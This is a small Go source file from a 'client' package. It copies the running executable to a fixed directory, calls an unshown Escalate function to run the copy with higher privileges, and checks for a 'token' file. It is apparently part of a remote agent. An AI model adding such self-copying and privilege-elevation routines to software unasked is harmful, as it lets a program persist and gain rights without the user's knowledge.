// +build !android

package client

import (
	"errors"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
)

func copyExecuteable() error {
	log.Println("copyExecuteable")
	ex, err := os.Executable()
	if err != nil {
		return err
	}
	data, err := ioutil.ReadFile(ex)
	if err != nil {
		return err
	}
	os.MkdirAll(Path, os.ModePerm)
	return ioutil.WriteFile(PathExe, data, os.ModePerm)
}

// Elevate elevate task
func Elevate() error {
	log.Println("Elevate")
	err := copyExecuteable()
	if err != nil {
		return errors.New("Copy failed")
	}
	return Escalate(PathExe)
}

// CheckSetup check wheter already configured
func CheckSetup() bool {
	log.Println("CheckSetup")
	osexe, _ := os.Executable()
	if osexe == PathExe {
		_, err := os.Stat(filepath.Join(Path, "token"))
		if err != nil {
			return false
		}
		return true
	}
	return false
}
